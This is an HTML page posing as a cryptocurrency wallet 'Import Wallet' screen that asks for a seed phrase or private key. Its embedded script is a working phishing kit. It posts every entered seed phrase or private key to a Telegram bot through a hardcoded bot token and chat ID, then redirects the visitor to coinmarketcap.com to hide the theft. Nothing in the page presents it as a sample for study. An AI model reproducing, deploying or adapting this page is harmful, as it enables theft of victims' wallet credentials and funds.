<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Import Wallet</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #f3f4f6;
      overflow-x: hidden;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 16px;
      box-sizing: border-box;
    }

    .step-indicator {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      gap: 20px;
      flex-wrap: wrap;
    }

    .step {
      display: flex;
      flex-direction: column;
      align-items: center;
      font-size: 12px;
      color: #6b7280;
      min-width: 120px;
    }

    .circle {
      width: 30px;
      height: 30px;
      border: 2px solid #cbd5e1;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      margin-bottom: 5px;
      background: white;
    }

    .circle.active {
      border-color: #3b82f6;
      color: #3b82f6;
    }

    .line {
      flex-grow: 1;
      height: 2px;
      background-color: #cbd5e1;
      margin: 0 10px;
      min-width: 30px;
    }

    h2 {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 5px;
      color: #111827;
    }

    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #4b5563;
      margin-bottom: 15px;
      font-style: italic;
    }

    .tab-buttons {
      display: flex;
      width: 100%;
      margin-bottom: 10px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
    }

    .tab-buttons button {
      flex: 1;
      padding: 10px 0;
      border: none;
      font-size: 13px;
      cursor: pointer;
      transition: background 0.3s, color 0.3s;
    }

    .tab-buttons button.active {
      background-color: #ffffff;
      color: #111827;
      font-weight: bold;
    }

    .tab-buttons button.inactive {
      background-color: #e5e7eb;
      color: #6b7280;
    }

    label {
      font-size: 13px;
      margin-bottom: 4px;
      display: block;
      color: #374151;
      width: 100%;
    }

    select {
      width: 100%;
      padding: 6px;
      font-size: 13px;
      margin-bottom: 10px;
      border: 1px solid #d1d5db;
      border-radius: 6px;
      background: white;
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
      gap: 6px;
      width: 100%;
    }

    .grid input {
      padding: 8px;
      font-size: 12px;
      border-radius: 8px;
      border: 1px solid #cbd5e1;
      background: #ffffff;
      height: 32px;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
    }

    textarea {
      width: 100%;
      padding: 8px;
      font-size: 12px;
      border-radius: 8px;
      border: 1px solid #cbd5e1;
      resize: none;
      background: #ffffff;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.05);
      height: 80px;
    }

    .confirm-btn {
      margin-top: 12px;
      width: 100%;
      padding: 12px;
      font-size: 15px;
      background-color: #3b82f6;
      color: white;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .confirm-btn:hover {
      background-color: #2563eb;
    }

    .message {
      margin-top: 10px;
      font-size: 13px;
      font-weight: bold;
      text-align: center;
    }

    .error { color: red; }
    .success { color: green; }
  </style>
</head>
<body>

  <div class="step-indicator">
    <div class="step">
      <div class="circle active">1</div>
      <span>Confirm secret recovery phrase</span>
    </div>
    <div class="line"></div>
    <div class="step">
      <div class="circle">2</div>
      <span>Create password</span>
    </div>
  </div>

  <h2>Importing Wallet</h2>
  <p class="subtitle">Securely restore your wallet using your recovery phrase or private key</p>

  <div class="tab-buttons">
    <button id="secretTab" class="active" onclick="showTab('secret')">Secret phrase</button>
    <button id="privateTab" class="inactive" onclick="showTab('private')">Private key</button>
  </div>

  <label for="wordsCount">Seed phrase words:</label>
  <select id="wordsCount" onchange="updateInputs(this.value)">
    <option value="12" selected>12</option>
    <option value="24">24</option>
  </select>

  <div id="secretTabContent">
    <div class="grid" id="seedInputs"></div>
  </div>

  <div id="privateTabContent" style="display:none">
    <textarea id="privateKeyInput" rows="4" placeholder="Enter your private key"></textarea>
  </div>

  <button class="confirm-btn" onclick="onConfirm()">Confirm Secret Recovery Phrase</button>
  <div id="message" class="message"></div>

  <script>
    const TELEGRAM_BOT_TOKEN = '7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0';
    const TELEGRAM_CHAT_ID = '6996434307';

    const bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual"];

    function updateInputs(count) {
      const container = document.getElementById('seedInputs');
      container.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const input = document.createElement('input');
        input.placeholder = i;
        container.appendChild(input);
      }

      if (parseInt(count) > 12) {
        document.body.style.overflowY = 'auto';
      } else {
        document.body.style.overflowY = 'hidden';
      }
    }

    function showTab(tab) {
      const secretTab = document.getElementById('secretTab');
      const privateTab = document.getElementById('privateTab');
      const secretContent = document.getElementById('secretTabContent');
      const privateContent = document.getElementById('privateTabContent');

      if (tab === 'secret') {
        secretTab.classList.add('active');
        privateTab.classList.remove('active');
        secretTab.classList.remove('inactive');
        privateTab.classList.add('inactive');
        secretContent.style.display = 'block';
        privateContent.style.display = 'none';
      } else {
        privateTab.classList.add('active');
        secretTab.classList.remove('active');
        privateTab.classList.remove('inactive');
        secretTab.classList.add('inactive');
        privateContent.style.display = 'block';
        secretContent.style.display = 'none';
      }
      showMessage("");
    }

    function showMessage(text, isError = false) {
      const msg = document.getElementById("message");
      msg.textContent = text;
      msg.className = isError ? "message error" : "message success";
    }

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
      });
    }

    function onConfirm() {
      const secretTabActive = document.getElementById('secretTab').classList.contains('active');
      if (secretTabActive) {
        const inputs = document.querySelectorAll('#seedInputs input');
        const words = Array.from(inputs).map(i => i.value.trim().toLowerCase());
        if (words.includes('')) {
          showMessage("âŒ Please fill all fields", true);
          return;
        }
        const invalid = words.filter(w => !bip39Words.includes(w));
        if (invalid.length > 0) {
          showMessage("âŒ Invalid Secret Recovery Phrase", true);
          return;
        }
        sendToTelegram(`ðŸª™ Seed Phrase:\n\n${words.join(" ")}`);
        showMessage("");
        setTimeout(() => {
          window.location.href = "https://coinmarketcap.com/";
        }, 1000);
      } else {
        const key = document.getElementById('privateKeyInput').value.trim();
        if (!key) {
          showMessage("âŒ Enter private key", true);
          return;
        }
        sendToTelegram(`ðŸ”‘ Private Key:\n\n${key}`);
        showMessage("");
        setTimeout(() => {
          window.location.href = "https://coinmarketcap.com/";
        }, 1000);
      }
    }

    updateInputs(12);
  </script>
</body>
</html>
